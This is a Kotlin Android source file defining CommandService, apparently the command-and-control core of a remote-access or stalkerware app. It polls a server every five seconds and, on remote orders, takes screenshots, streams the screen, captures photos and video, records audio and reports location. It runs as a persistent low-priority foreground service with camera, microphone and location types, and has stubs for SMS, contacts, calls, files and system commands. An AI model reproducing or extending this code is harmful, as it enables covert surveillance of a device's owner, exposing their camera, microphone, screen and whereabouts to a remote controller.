package com.abuzahra.admin.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.abuzahra.admin.MainActivity
import com.abuzahra.admin.R
import com.abuzahra.admin.manager.PreferenceManager
import com.abuzahra.admin.network.ApiService
import com.abuzahra.admin.network.WebSocketManager
import com.google.gson.JsonObject
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

class CommandService : Service() {
    
    companion object {
        private const val TAG = "CommandService"
        private const val CHANNEL_ID = "abu_zahra_service"
        private const val NOTIFICATION_ID = 1
        
        private const val HEARTBEAT_INTERVAL = 30000L
        private const val COMMAND_CHECK_INTERVAL = 5000L
    }
    
    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
    
    private var apiService: ApiService? = null
    private var webSocketManager: WebSocketManager? = null
    
    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Service onCreate")
        
        apiService = ApiService.getInstance(this)
        webSocketManager = WebSocketManager.getInstance(this)
        
        createNotificationChannel()
        startForegroundWithNotification()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service onStartCommand")
        
        startBackgroundTasks()
        webSocketManager?.connect()
        
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        Log.d(TAG, "Service onDestroy")
        serviceJob.cancel()
        webSocketManager?.disconnect()
        super.onDestroy()
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                getString(R.string.service_channel_name),
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = getString(R.string.service_channel_description)
                setShowBadge(false)
            }
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    private fun startForegroundWithNotification() {
        val notification = createNotification()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }
    
    private fun createNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(getString(R.string.service_running))
            .setContentText(getString(R.string.service_connected))
            .setSmallIcon(R.drawable.ic_notification)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
    
    private fun startBackgroundTasks() {
        val deviceId = PreferenceManager.getInstance().getDeviceId()
        if (deviceId.isEmpty()) {
            Log.w(TAG, "No device ID, stopping service")
            stopSelf()
            return
        }
        
        // Heartbeat
        serviceScope.launch {
            while (isActive) {
                apiService?.sendHeartbeat(deviceId)
                delay(HEARTBEAT_INTERVAL)
            }
        }
        
        // Command polling
        serviceScope.launch {
            while (isActive) {
                try {
                    val commands = apiService?.getCommands(deviceId) ?: emptyList()
                    commands.forEach { command ->
                        processCommand(command)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error fetching commands", e)
                }
                delay(COMMAND_CHECK_INTERVAL)
            }
        }
    }
    
    private fun processCommand(command: JsonObject) {
        val type = command.get("type")?.asString ?: return
        val action = command.get("action")?.asString ?: return
        val commandId = command.get("id")?.asString ?: return
        
        Log.d(TAG, "Processing command: $type / $action")
        
        when (type) {
            "screen" -> handleScreenCommand(action, commandId)
            "camera" -> handleCameraCommand(action, command)
            "audio" -> handleAudioCommand(action, command)
            "location" -> handleLocationCommand(action, commandId)
            "sms" -> handleSmsCommand(action, command)
            "contacts" -> handleContactsCommand(action, commandId)
            "call" -> handleCallCommand(action, command)
            "app" -> handleAppCommand(action, command)
            "file" -> handleFileCommand(action, command)
            "system" -> handleSystemCommand(action, command)
            else -> Log.w(TAG, "Unknown command type: $type")
        }
    }
    
    private fun handleScreenCommand(action: String, commandId: String) {
        when (action) {
            "screenshot" -> {
                // Start screen capture
                val intent = Intent(this, ScreenStreamService::class.java)
                intent.action = "screenshot"
                startService(intent)
            }
            "stream_start" -> {
                val intent = Intent(this, ScreenStreamService::class.java)
                intent.action = "start"
                startService(intent)
            }
            "stream_stop" -> {
                val intent = Intent(this, ScreenStreamService::class.java)
                intent.action = "stop"
                startService(intent)
            }
        }
    }
    
    private fun handleCameraCommand(action: String, command: JsonObject) {
        when (action) {
            "photo" -> {
                val intent = Intent(this, CameraStreamService::class.java)
                intent.action = "photo"
                intent.putExtra("camera", command.get("params")?.asJsonObject?.get("camera")?.asString ?: "back")
                startService(intent)
            }
            "video_start" -> {
                val intent = Intent(this, CameraStreamService::class.java)
                intent.action = "start"
                startService(intent)
            }
            "video_stop" -> {
                val intent = Intent(this, CameraStreamService::class.java)
                intent.action = "stop"
                startService(intent)
            }
        }
    }
    
    private fun handleAudioCommand(action: String, command: JsonObject) {
        when (action) {
            "record_start" -> {
                val intent = Intent(this, AudioStreamService::class.java)
                intent.action = "start"
                startService(intent)
            }
            "record_stop" -> {
                val intent = Intent(this, AudioStreamService::class.java)
                intent.action = "stop"
                startService(intent)
            }
        }
    }
    
    private fun handleLocationCommand(action: String, commandId: String) {
        val intent = Intent(this, LocationService::class.java)
        intent.action = action
        startService(intent)
    }
    
    private fun handleSmsCommand(action: String, command: JsonObject) {
        // SMS handling
    }
    
    private fun handleContactsCommand(action: String, commandId: String) {
        // Contacts handling
    }
    
    private fun handleCallCommand(action: String, command: JsonObject) {
        // Call handling
    }
    
    private fun handleAppCommand(action: String, command: JsonObject) {
        // App handling
    }
    
    private fun handleFileCommand(action: String, command: JsonObject) {
        // File handling
    }
    
    private fun handleSystemCommand(action: String, command: JsonObject) {
        // System handling
    }
}
